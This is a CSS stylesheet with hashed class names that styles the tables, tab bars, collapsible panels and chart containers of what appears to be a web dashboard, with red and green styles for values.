    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE {
        display: table-header-group
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy {
        display: table-row
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv.wMl-wmO8uD_yOzFlrEi72 {
        width: 35%
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv._3YHuozA91GhsuOsQ-8o5iS {
        width: 15%
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv.ahf-P9n2WzPQlUS2kE6EA {
        width: 25%
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv._31kvbZFd4jzbiMf529t2ou {
        width: 15%
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._2vvH-mC677YlycTXKtXaVE ._5CK5Z-2Vo52fOmWOxbdDy ._2I5jzTAjQv1nn3hP_Jckkv:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp {
        display: table-header-group
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy {
        display: table-row
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz._1Yp9-w1Zla0HjSRkqG6c9Y * {
        cursor: pointer
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._2Ygi5rjpw19SNvDH-esFep {
        width: 32px;
        height: 32px;
        border-radius: 4px;
        overflow: hidden
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._1UzMB2MiW1jT4ytn21Cg9K {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._1UzMB2MiW1jT4ytn21Cg9K:hover {
        color: var(--ah-primary-hover)
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._2u_7cydmaiD36pGjUl1hks {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz._26c0F9tzqD6_RUCiK6YV-F>span {
        display: flex;
        align-items: center
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz._26c0F9tzqD6_RUCiK6YV-F>span span {
        display: inline-flex;
        margin-right: 5px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ujeM5tWrEAjAefVvqK5uc,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._2GMqKjJAE6Qldr6TSSgbBX {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ujeM5tWrEAjAefVvqK5uc svg,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._2GMqKjJAE6Qldr6TSSgbBX svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ujeM5tWrEAjAefVvqK5uc svg,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ujeM5tWrEAjAefVvqK5uc path,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._2GMqKjJAE6Qldr6TSSgbBX svg,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz ._2GMqKjJAE6Qldr6TSSgbBX path {
        fill: #21a67a
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .RhDK3MnsypHyARENaqCP6,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ZoAQY6cYo1he5B49nCRgr {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .RhDK3MnsypHyARENaqCP6 svg,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ZoAQY6cYo1he5B49nCRgr svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .RhDK3MnsypHyARENaqCP6 svg,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .RhDK3MnsypHyARENaqCP6 path,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ZoAQY6cYo1he5B49nCRgr svg,
    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz .ZoAQY6cYo1he5B49nCRgr path {
        fill: #e9162b
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz._2tBVlWqNYGPFurA4yA92_U {
        white-space: nowrap
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 ._1jGL9eQb3YdaYd349pTVWp ._5CK5Z-2Vo52fOmWOxbdDy ._1bHPCEarOaktXCCD2wC-mz._2tBVlWqNYGPFurA4yA92_U span {
        display: inline-flex
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .sZlZXfxLbU6lz6kue1Bet {
        display: flex;
        align-items: center;
        margin-top: 8px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2OSaIrrB9bYYNa9Rc_Q9za {
        margin-right: 4px;
        display: inline-flex;
        width: 20px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._1mLxQPksbS8v60Hf-MTfTY {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        font-size: 18px;
        font-weight: 600;
        color: #262626;
        max-width: 200px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._1XqWE4GsWcrwpecFgvnCmO {
        display: flex;
        text-align: center !important;
        flex-direction: column;
        justify-content: center;
        margin-top: 20px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._1XqWE4GsWcrwpecFgvnCmO>div {
        text-align: center;
        cursor: pointer;
        color: var(--ah-secondary)
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._1XqWE4GsWcrwpecFgvnCmO ._1Fzi6VxKovhpYAk1crverN {
        text-align: center
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._1XqWE4GsWcrwpecFgvnCmO ._1Fzi6VxKovhpYAk1crverN svg {
        height: 16px !important;
        cursor: pointer
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._1XqWE4GsWcrwpecFgvnCmO ._1Fzi6VxKovhpYAk1crverN svg path {
        fill: var(--ah-secondary)
    }

    ._2Z8UjYvlZI9vcDI5aDoK3 {
        padding: 32px 0
    }

    ._2Z8UjYvlZI9vcDI5aDoK3 .clK7WJX_4VPkfOavbuG9P {
        height: 230px;
        position: relative
    }

    ._2Z8UjYvlZI9vcDI5aDoK3 ._3vQdFfy2BkhkvIcSlIQT6D {
        height: 100% !important
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa {
        padding: 0 20px
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w {
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08);
        margin-left: -20px;
        margin-right: -20px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w ._1xKLLtsy8HYYDjNHSxD6ZW {
        display: inline-flex;
        align-items: center
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w ._1xKLLtsy8HYYDjNHSxD6ZW ._3bQ49cHo9ZrPfQVXFrkJy2 {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w ._1xKLLtsy8HYYDjNHSxD6ZW._2gqT345WajFaZ5-whuzFQt ._3bQ49cHo9ZrPfQVXFrkJy2 {
        cursor: pointer
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w ._1xKLLtsy8HYYDjNHSxD6ZW._2gqT345WajFaZ5-whuzFQt:hover {
        color: var(--ah-secondary)
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w ._1xKLLtsy8HYYDjNHSxD6ZW._2gqT345WajFaZ5-whuzFQt:hover ._3bQ49cHo9ZrPfQVXFrkJy2 {
        color: var(--ah-secondary)
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._2lhKYHgk524xby_6Ybnu5w:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._368Hj0tXCWT6_VtusvU-xV {
        min-height: calc(100vh - 460px);
        max-height: calc(100vh - 200px)
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._368Hj0tXCWT6_VtusvU-xV .bcG3kJoT4MqK38oMVW3NI {
        display: flex;
        align-items: center;
        border-bottom: 1px solid #d9d9d9;
        padding: 0 6px;
        margin-top: 20px
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._368Hj0tXCWT6_VtusvU-xV .bcG3kJoT4MqK38oMVW3NI span {
        display: inline-flex;
        font-size: 14px;
        font-weight: 600;
        color: #262626;
        padding-bottom: 10px;
        position: relative;
        cursor: pointer
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._368Hj0tXCWT6_VtusvU-xV .bcG3kJoT4MqK38oMVW3NI span+span {
        margin-left: 40px
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._368Hj0tXCWT6_VtusvU-xV .bcG3kJoT4MqK38oMVW3NI span.-GSgLqTy8ywyWitAwvClX {
        color: #e9162b
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._368Hj0tXCWT6_VtusvU-xV .bcG3kJoT4MqK38oMVW3NI span.-GSgLqTy8ywyWitAwvClX:before {
        content: ' ';
        display: block;
        width: 100%;
        height: 2px;
        background: #e9162b;
        position: absolute;
        left: 0;
        bottom: -2px
    }

    ._2O_zaY4T8ACdczbyUGzPWq._2Y8LNqlz6eIl46stUMdfTa ._3wZnuan5jIwTAY0v0yo_2c {
        position: relative;
        background: #f5f5f5;
        min-height: 400px;
        width: 100%;
        margin: 20px 0;
        border-radius: 4px
    }

    ._3VAg9WtXxlKj4u0RNhGaub._1ywAB_5h2wKlpoogOoahtN ._1z7SEcArg1LPv5wRGOj82S {
        max-width: 1200px;
        margin: 20px auto
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 {
        padding: 16px 24px !important
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3nodPH2b87AVXUkQblTtfM {
        display: flex;
        align-items: center;
        justify-content: space-between;
        width: 100%;
        cursor: pointer;
        user-select: none
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3nodPH2b87AVXUkQblTtfM * {
        cursor: pointer;
        user-select: none
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3nodPH2b87AVXUkQblTtfM ._2-mc-2vzz9uCDDmOh47BcZ {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 6px;
        margin-left: -12px;
        font-weight: 700
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3nodPH2b87AVXUkQblTtfM ._2-mc-2vzz9uCDDmOh47BcZ {
        font-size: 16px;
        line-height: 16px;
        color: #2e2e2e
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3nodPH2b87AVXUkQblTtfM ._1XsQR0mdnq7jjfrZw77XK6 {
        width: 12px;
        height: 12px;
        display: flex;
        align-items: center;
        justify-content: center
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3nodPH2b87AVXUkQblTtfM ._1XsQR0mdnq7jjfrZw77XK6._2lyapov2pbRQQWDuC7TI4P {
        transform: rotate(180deg)
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3iFfV24N2JuWg4CHKozME4 {
        display: grid;
        grid-template-columns: 1fr 1px 1fr;
        gap: 15.5px
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._1zCGDdGyowmAjpFVkpnbKu {
        display: flex;
        align-items: center;
        gap: 8px;
        cursor: pointer;
        user-select: none;
        justify-content: flex-end;
        color: var(--ah-red-100);
        font-weight: 600
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._1zCGDdGyowmAjpFVkpnbKu ._1xSU57QvsdVHomV4kP9usi {
        width: 16px;
        height: 16px;
        background-position: center;
        background-repeat: no-repeat
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3v_icQwv47mc6FOcs6nqLP {
        display: flex;
        align-items: center;
        gap: 8px;
        justify-content: center;
        color: var(--ah-red-100);
        font-weight: 600;
        cursor: pointer
    }

    .YoKHLEA2r6MZPshyQ4yEa._2E6xUeErrNqHTVCd6evij5 ._3v_icQwv47mc6FOcs6nqLP .YUlFEq-ZXFQzJUGzZIwAL {
        width: 16px;
        height: 16px;
        background-position: center;
        background-repeat: no-repeat
    }

    ._1TknbtrobNZv2QyUYGqRvV {
        opacity: 0 !important;
        max-height: 0 !important
    }

    ._3LnZbCWMSHwf3eOrZbwJCx {
        opacity: 1 !important;
        max-height: 9999px !important;
        transition: 500ms !important
    }

    ._3FmFOCzAZt_RWrLXID4KSL {
        max-height: 9999px !important;
        opacity: 1 !important
    }

    ._1fOYUTqjXpHHpslFuyEA8D {
        max-height: 0 !important;
        opacity: 0 !important;
        transition: 500ms !important
    }

    .l3zQJnMqP9Ywax6CDBuyx._1I-vCP5WlwDERucHdi3cTH {
        box-sizing: border-box;
        border-radius: 8px
    }

    .l3zQJnMqP9Ywax6CDBuyx ._2S1GCh7GzmPBC83g3ndoHE {
        display: flex;
        align-items: center;
        justify-content: space-between;
        min-height: 48px;
        padding: 0 16px;
        user-select: none
    }

    .l3zQJnMqP9Ywax6CDBuyx ._2S1GCh7GzmPBC83g3ndoHE * {
        user-select: none
    }

    .l3zQJnMqP9Ywax6CDBuyx ._47O06ETgJLLKCqPQgQ3K {
        font-size: 12px;
        line-height: 16px;
        color: var(--ah-blue-100)
    }

    .l3zQJnMqP9Ywax6CDBuyx ._1nnthWL5xt4vPvkTRhERgF {
        width: 12px;
        height: 12px;
        display: flex;
        align-items: center;
        justify-content: center
    }

    .l3zQJnMqP9Ywax6CDBuyx ._1nnthWL5xt4vPvkTRhERgF._2zhPJBigZbqEnYNJFmvgsS {
        transform: rotate(90deg)
    }

    .l3zQJnMqP9Ywax6CDBuyx ._1M_NJZikRvuXsxZWJYxytY {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 24px;
        padding: 0 16px
    }

    .l3zQJnMqP9Ywax6CDBuyx ul._1qmbosW-MG1pmbh6LPE3v3 {
        display: flex;
        list-style: none;
        padding: 0;
        margin: 0
    }

    .l3zQJnMqP9Ywax6CDBuyx ul._1qmbosW-MG1pmbh6LPE3v3 li {
        margin-right: 35px
    }

    .l3zQJnMqP9Ywax6CDBuyx ul._1qmbosW-MG1pmbh6LPE3v3 li:last-child {
        margin-right: 0
    }

    .l3zQJnMqP9Ywax6CDBuyx ._3uA-o8hlT5wmgCy124WPKn {
        display: flex;
        align-items: center
    }

    .l3zQJnMqP9Ywax6CDBuyx ._3uA-o8hlT5wmgCy124WPKn div {
        margin: 0 4px;
        color: var(--ah-grey-100)
    }

    .l3zQJnMqP9Ywax6CDBuyx ._33Z86ou7kitE-4S2hZHn0Q {
        width: 1px;
        height: 40px;
        background-color: var(--ah-grey-700)
    }

    .l3zQJnMqP9Ywax6CDBuyx .DiiCBHwRdL3cQocEx2qOX ._2iZp_a2AQdr3Lhb7Q6hPzj {
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    .l3zQJnMqP9Ywax6CDBuyx .DiiCBHwRdL3cQocEx2qOX ._3MjrvMQcdM4gisEKwOVmZX {
        color: var(--ah-primary)
    }

    ._2TBBhIvaZMhEJr6i2MLSNI {
        padding: 32px 0
    }

    ._2TBBhIvaZMhEJr6i2MLSNI ._1fQWBDIffQ-FVoQHPG5b2x {
        height: 230px;
        position: relative
    }

    ._2TBBhIvaZMhEJr6i2MLSNI ._3GkfVQH_xSTPp3BsQ9AMML {
        height: 100% !important
    }

    .H01IX3PH4GvouQ9nbxdYL._273ZRFu_dJRZ3uizbdTVIY {
        box-sizing: border-box;
        border-radius: 8px
    }

    .H01IX3PH4GvouQ9nbxdYL ._2vt163TzpLJJfxU6n83Pab {
        display: flex;
        align-items: center;
        justify-content: space-between;
        min-height: 48px;
        padding: 0 16px;
        user-select: none
    }

    .H01IX3PH4GvouQ9nbxdYL ._2vt163TzpLJJfxU6n83Pab * {
        user-select: none
    }

    .H01IX3PH4GvouQ9nbxdYL .ZfIY_WPflxw_8wO2Tl4qD {
        font-size: 12px;
        line-height: 16px;
        color: var(--ah-red-100)
    }

    .H01IX3PH4GvouQ9nbxdYL ._10n2EdklZ7iXNNnOzEvGCu {
        width: 12px;
        height: 12px;
        display: flex;
        align-items: center;
        justify-content: center
    }

    .H01IX3PH4GvouQ9nbxdYL ._10n2EdklZ7iXNNnOzEvGCu._2FT8sDgM-ecHpaVluXL6LI {
        transform: rotate(90deg)
    }

    .H01IX3PH4GvouQ9nbxdYL .vKJoprkO7qAAAnBcgB57j {
        font-weight: 700;
        color: var(--ah-black-200);
        font-size: 12px;
        margin-bottom: 1px
    }

    .H01IX3PH4GvouQ9nbxdYL .tHMLJZlkYKWO_3gTXL8XX {
        color: var(--ah-black-200)
    }

    .c-KiJGU9voh7RtZJ5nxk3 {
        padding: 32px 0
    }

    .c-KiJGU9voh7RtZJ5nxk3 .FJtuvQg8nlCWZp09HNj53 {
        height: 210px;
        position: relative
    }

    .c-KiJGU9voh7RtZJ5nxk3 ._2lhcXTOimYB8ZDRfiKPLQE {
        height: 100% !important
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX {
        padding: 16px 0
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._3bfTWShqLwKhk5S52Y8t4n {
        max-width: 1200px;
        min-height: 100px;
        margin: auto
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM {
        background-color: #fff;
        border-radius: 4px;
        border: 1px solid var(--ah-red-100);
        padding: 10px 10px
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 12px;
        padding-bottom: 10px;
        border-bottom: 1px solid var(--ah-grey-700);
        width: 100%
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._3wMjQpjlBzJgi3Cj3PGFi0 {
        margin-left: 8px;
        font-weight: bold;
        color: var(--ah-grey-100)
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._1_uIbbbKXoLI2I5RD0IxUj {
        display: flex;
        align-items: center
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._2BL5SDC9Zxvg7sCBwnf35P ._1xbtD8az_srq4J99zLex_e {
        display: flex;
        align-items: center;
        justify-content: space-between;
        user-select: none
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._2BL5SDC9Zxvg7sCBwnf35P ._1xbtD8az_srq4J99zLex_e a {
        cursor: pointer;
        color: var(--ah-blue-100)
    }

    ._1RZBtmjtSv8E8HgmH7LKtP.vRb5DIdeUYIrYA4Vx-MVX ._2WYXMnUPb2U4LSl3hO0VlM ._3CrUmQgUtPfBxAd_k6xECt ._2BL5SDC9Zxvg7sCBwnf35P ._1xbtD8az_srq4J99zLex_e ._11SqjWi2NMl4Hscx-e5B8j {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-right: 12px
    }

